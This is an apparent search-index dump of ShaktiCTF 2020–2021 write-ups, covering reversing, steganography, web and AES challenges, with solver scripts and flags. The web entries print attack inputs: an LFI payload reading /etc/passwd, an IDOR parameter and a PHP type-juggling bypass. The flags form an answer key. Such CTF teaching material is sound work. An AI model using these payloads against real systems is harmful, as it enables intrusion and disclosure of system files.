shaktictf{K33p_th3_gam3_g0ing_gurl!}","title":"damEz"},{"location":"ShaktiCTF20/reversing/damez/#damez","text":"","title":"damEz"},{"location":"ShaktiCTF20/reversing/damez/#challenge-description","text":"Oops! There was a sudden crash on Margret's system. She's afraid that she lost the passcode which she needs in urgency for running a simple prog which hopefully was backed up. Could you figure out the passcode and run the program successfully.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/damez/#short-writeup","text":"String Compare. The flag is hardcoded in the binary. If you simply do strings challfile you get all the strings in the program. One of them is the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/reversing/damez/#flag","text":"shaktictf{K33p_th3_gam3_g0ing_gurl!}","title":"Flag"},{"location":"ShaktiCTF20/reversing/intro/","text":"Reversing Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/intro/#reversing","text":"Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/reach_the_moon/","text":"REach The Moon Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6 Challenge Description Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind. Solution In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?} Flag shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#reach-the-moon","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#challenge-description","text":"Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#solution","text":"In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?}","title":"Solution"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#flag","text":"shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"Flag"},{"location":"ShaktiCTF20/reversing/xoxo/","text":"XOXO Challenge Description During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules. Writeup The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input. Script from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved. Flag shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#xoxo","text":"","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#challenge-description","text":"During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/xoxo/#writeup","text":"The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input.","title":"Writeup"},{"location":"ShaktiCTF20/reversing/xoxo/#script","text":"from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved.","title":"Script"},{"location":"ShaktiCTF20/reversing/xoxo/#flag","text":"shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"Flag"},{"location":"ShaktiCTF20/stego/hidd3n/","text":"Hidd3n Challenge Description Seems like there is something hidden in this image. Can you find it out? Short writeup The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag. Challenge Author v1Ru5 Flag shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#hidd3n","text":"","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-description","text":"Seems like there is something hidden in this image. Can you find it out?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/hidd3n/#short-writeup","text":"The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/hidd3n/#flag","text":"shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Flag"},{"location":"ShaktiCTF20/stego/intro/","text":"Steganography Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/intro/#steganography","text":"Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/invisible/","text":"Invisible Stego Author : v1Ru5 Challenge Description One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING} Short writeup: The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#invisible","text":"","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#stego","text":"Author : v1Ru5","title":"Stego"},{"location":"ShaktiCTF20/stego/invisible/#challenge-description","text":"One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/invisible/#short-writeup","text":"The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Short writeup:"},{"location":"ShaktiCTF20/stego/just_crack_it/","text":"Just Crack It Challenge Description One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us? Short writeup Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag. Challenge Author v1Ru5 Flag shaktictf{y0u_M4d3_iT_85284501}","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#just-crack-it","text":"","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-description","text":"One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/just_crack_it/#short-writeup","text":"Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/just_crack_it/#flag","text":"shaktictf{y0u_M4d3_iT_85284501}","title":"Flag"},{"location":"ShaktiCTF20/stego/pretty_good/","text":"Pretty Good Challenge Description Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message? Short writeup Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag. Challenge Author v1Ru5 Flag skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#pretty-good","text":"","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-description","text":"Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/pretty_good/#short-writeup","text":"Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/pretty_good/#flag","text":"skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Flag"},{"location":"ShaktiCTF20/stego/secret/","text":"Secret Challenge Description An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information? Short writeup Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully. Challenge Author v1Ru5 Flag shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#secret","text":"","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#challenge-description","text":"An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/secret/#short-writeup","text":"Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/secret/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/secret/#flag","text":"shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Flag"},{"location":"ShaktiCTF20/web/ador/","text":"Ador Challenge Description Ada was born on 10 December 1815 not 12, identification change makes a difference Short Writeup In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin Flag shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#ador","text":"","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#challenge-description","text":"Ada was born on 10 December 1815 not 12, identification change makes a difference","title":"Challenge Description"},{"location":"ShaktiCTF20/web/ador/#short-writeup","text":"In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin","title":"Short Writeup"},{"location":"ShaktiCTF20/web/ador/#flag","text":"shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Flag"},{"location":"ShaktiCTF20/web/authen/","text":"Authen Challenge Description Ada is important to the world, she is important for a reason Short Writeup In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125)); Flag shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#authen","text":"","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#challenge-description","text":"Ada is important to the world, she is important for a reason","title":"Challenge Description"},{"location":"ShaktiCTF20/web/authen/#short-writeup","text":"In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125));","title":"Short Writeup"},{"location":"ShaktiCTF20/web/authen/#flag","text":"shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Flag"},{"location":"ShaktiCTF20/web/biscuits/","text":"Biscuits Author m0n574 Challenge Description Ada Lovelace used to love eating french biscuits during her work Short Writeup The cookie has the flag which should be hex decoded Flag shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#biscuits","text":"","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/biscuits/#challenge-description","text":"Ada Lovelace used to love eating french biscuits during her work","title":"Challenge Description"},{"location":"ShaktiCTF20/web/biscuits/#short-writeup","text":"The cookie has the flag which should be hex decoded","title":"Short Writeup"},{"location":"ShaktiCTF20/web/biscuits/#flag","text":"shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Flag"},{"location":"ShaktiCTF20/web/doors/","text":"Doors Challenge Description Ada Loves to travel to places, London-Paris-Spain and discover more Short Writeup You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd Flag shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#doors","text":"","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#challenge-description","text":"Ada Loves to travel to places, London-Paris-Spain and discover more","title":"Challenge Description"},{"location":"ShaktiCTF20/web/doors/#short-writeup","text":"You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd","title":"Short Writeup"},{"location":"ShaktiCTF20/web/doors/#flag","text":"shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Flag"},{"location":"ShaktiCTF20/web/intro/","text":"Web Exploitation Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/intro/#web-exploitation","text":"Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/machine/","text":"Machine Author m0n574 Challenge Description Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid Short Writeup The robots.txt files shows the disallowed files where the flag is kept Flag shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#machine","text":"","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/machine/#challenge-description","text":"Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid","title":"Challenge Description"},{"location":"ShaktiCTF20/web/machine/#short-writeup","text":"The robots.txt files shows the disallowed files where the flag is kept","title":"Short Writeup"},{"location":"ShaktiCTF20/web/machine/#flag","text":"shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Flag"},{"location":"ShaktiCTF20/web/phphar/","text":"PHPhar Challenge Description Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain Short Writeup bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff Flag shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#phphar","text":"","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#challenge-description","text":"Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain","title":"Challenge Description"},{"location":"ShaktiCTF20/web/phphar/#short-writeup","text":"bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff","title":"Short Writeup"},{"location":"ShaktiCTF20/web/phphar/#flag","text":"shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"Flag"},{"location":"ShaktiCTF21/crypto/AES/","text":"Awesome Encryption Scheme Authored by: Sowmya (@__4lpha__) Challenge Script: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from os import urandom from flag import flag keys = [md5(urandom(3)).digest() for _ in range(2)] def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def encrypt(m: bytes, iv1: bytes, iv2: bytes) -> bytes: m = pad(m,32) ciphers = get_ciphers(iv1, iv2) c = m for cipher in ciphers: c = b''.join(i[16:]+bytexor(i[:16],cipher.encrypt(i[16:])) for i in [c[i:i+32] for i in range(0,len(c),32)]) return c plaintext = f'finally now i am able to send my secret with double security and double trust, {flag}'.encode() iv1, iv2 = urandom(16),urandom(16) ciphertext = encrypt(plaintext, iv1, iv2) ciphertext = b\":\".join([x.hex().encode() for x in [iv1, iv2, ciphertext]]) open('encrypted','wb').write(ciphertext) Output: c486732c526c5b60bc29bae6926644eb:5fe355033095d413e601a7ede00fca1d:fd68e8732bb6e9b5672730eb1ed3f2fe9c88b5503e3fb08747ce3dd17296e383ccb76b78587bb1bd1337574073a185e9d846aeab36929d0101e433a34db0cf9ed034abb473a2280624d430c39e58c245603f56a4ddb1127a9f74051481440bbbe53fd95bc8a2a9a3f3488c68d1d9fa8e82cb40dce3df7b2d1c22fca0d05d08c9d197e053586643b32d3dbd4421996ad6abf2a1a930eb16609303471808bac90b This is a customised encryption scheme. So let's take a look at the block diagram to get better understanding of the encryption scheme. Enryption Block Diagram: Message-Block ---------------------------------------------------- | L0 | R0 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CBC |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Meet V ---------------------------------------------------- | L1 == R0 | L2 == R1 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CFB |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Cipher-Block V ---------------------------------------------------- | L2 | R2 | ---------------------------------------------------- Observation: If we notice the block diagram we can say that the encryption function is using two rounds of fiestal structure * Now we have L1||R1 * Key is a hash of 3 random bytes (can be bruteforced) We can find the key used for AES-CBC by using L0, R0, R1(L2) : * Since R1 = L0 ^ E( R0 ) where E stands for CBC-Encryption -> R1 = L0 ^ E( R0 ) -> R1 ^ L0 = E(R0) -> L2 ^ L0 = E(R0) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CBC-key In detail: keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if 